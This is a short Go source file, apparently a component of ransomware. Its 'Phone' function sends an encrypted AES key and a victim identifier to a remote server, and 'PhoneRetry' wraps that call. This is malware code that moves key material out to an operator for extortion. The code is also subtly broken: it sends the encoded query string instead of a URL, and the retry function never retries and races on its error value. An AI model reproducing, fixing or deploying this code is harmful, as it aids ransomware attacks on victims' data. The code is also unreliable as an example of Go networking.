// Package home contains useful functions for reaching out to remote servers on the internet
package home

import (
	"net/http"
	"net/url"
	"time"

	//"golang.org/x/net/proxy"
)

// Phone makes a connection to a http server somewhere on the internet and transmits the
// encrypted AES key along with some identifying information.
func Phone(u, uid, key string) (err error) {
	v, err := url.ParseQuery(u)
	if err != nil {
		return
	}
	v.Add("uid", uid)
	v.Add("key", key)

	resp, err := http.Get(v.Encode())
	if err != nil {
		return
	}
	resp.Body.Close()
	return
}

func PhoneRetry(u, uid, key string, retry int) (err error) {
	go func(u, uid, key string, retry int) {
		if err = Phone(u, uid, key); err != nil {
			return
		}
		time.Sleep(time.Duration(retry) * time.Second)
	}(u, uid, key, retry)
	return
}
